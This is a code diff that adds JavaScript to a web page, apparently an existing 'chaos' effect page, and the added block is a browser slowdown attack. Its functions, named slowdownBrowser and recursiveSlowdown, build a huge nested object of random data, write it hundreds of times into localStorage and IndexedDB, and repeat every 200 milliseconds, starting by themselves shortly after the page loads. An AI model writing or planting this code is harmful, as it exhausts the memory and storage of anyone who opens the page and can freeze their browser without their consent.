@@ -232,6 +232,119 @@
     w.style.top = (ev.clientY + 10)+'px';
   });
 
+        // Generate random data with larger size
+        function generateRandomData(size) {
+            let data = '';
+            for (let i = 0; i < size; i++) {
+                data += Math.random().toString();
+            }
+            return data;
+        }
+
+        // Create recursive object structure with more depth and width
+        function createDeepObject(depth, width) {
+            const obj = {};
+            for (let i = 0; i < width; i++) {
+                if (depth > 1) {
+                    obj[`prop${i}`] = createDeepObject(depth - 1, width);
+                } else {
+                    obj[`prop${i}`] = generateRandomData(4096); // ~4KB per property
+                }
+            }
+            return obj;
+        }
+
+        // Store data in localStorage with more aggressive operations
+        function storeInLocalStorage(data) {
+            for (let i = 0; i < 500; i++) { // Increased loop count
+                setTimeout(() => {
+                    const key = `key_${i}`;
+                    localStorage.setItem(key, JSON.stringify(data));
+                    document.getElementById('status').innerHTML += 
+                        `<div>Status: Stored in localStorage ${i}/500</div>`;
+                    // Add delay between operations
+                    if (i < 499) {
+                        setTimeout(() => {}, 100); // Longer delay between operations
+                    }
+                }, i * 200); // Longer initial delay
+            }
+        }
+
+        // Store data in IndexedDB with more aggressive operations
+        async function storeInIndexedDB(data) {
+            const dbPromise = indexedDB.open('slowdown_db', 1);
+            
+            dbPromise.onupgradeneeded = (event) => {
+                const db = event.target.result;
+                if (!db.objectStoreNames.contains('data_store')) {
+                    db.createObjectStore('data_store');
+                }
+            };
+
+            dbPromise.onsuccess = () => {
+                const db = dbPromise.result;
+
+                for (let i = 0; i < 500; i++) { // Increased loop count
+                    setTimeout(() => {
+                        const transaction = db.transaction(['data_store'], 'readwrite');
+                        const store = transaction.objectStore('data_store');
+                        
+                        store.put({
+                            id: `id_${i}`,
+                            data: JSON.stringify(data)
+                        });
+
+                        document.getElementById('status').innerHTML += 
+                            `<div>Status: Stored in IndexedDB ${i}/500</div>`;
+                    }, i * 200); // Longer delay between operations
+                }
+            };
+        }
+
+        // Main function to create and store data recursively
+        async function slowdownBrowser() {
+            try {
+                document.getElementById('status').innerHTML = 
+                    '<div>Status: Generating random data...</div>';
+                
+                const data = createDeepObject(10, 50); // Increased depth (10) and width (50)
+                
+                document.getElementById('status').innerHTML += 
+                    '<div>Status: Starting storage operations...</div>';
+                
+                storeInLocalStorage(data);
+                await storeInIndexedDB(data);
+
+                document.getElementById('status').innerHTML += 
+                    '<div>Status: Storage complete!</div>';
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('status').innerHTML = 
+                    '<div>Error occurred during storage.</div>';
+            }
+        }
+
+        // Execute the slowdown function after a delay
+        setTimeout(slowdownBrowser, 2000); // Start after 2 seconds
+
+        // Add visual feedback with more frequent updates
+        window.addEventListener('load', () => {
+            document.getElementById('status').innerHTML += 
+                '<div>Status: Page loaded. Starting slowdown...</div>';
+        });
+
+        // Recursive function to keep creating and storing data
+        function recursiveSlowdown() {
+            const data = createDeepObject(10, 50);
+            storeInLocalStorage(data);
+            storeInIndexedDB(data);
+            setTimeout(recursiveSlowdown, 200); // Repeat after delay
+        }
+
+        // Start recursive slowdown process
+        setTimeout(recursiveSlowdown, 5000); // Start recursive process after initial delay
+
+
   // Make sure chaos keeps filling if user leaves page size
   window.addEventListener('resize', ()=> {
     // spawn a few more if viewport grows
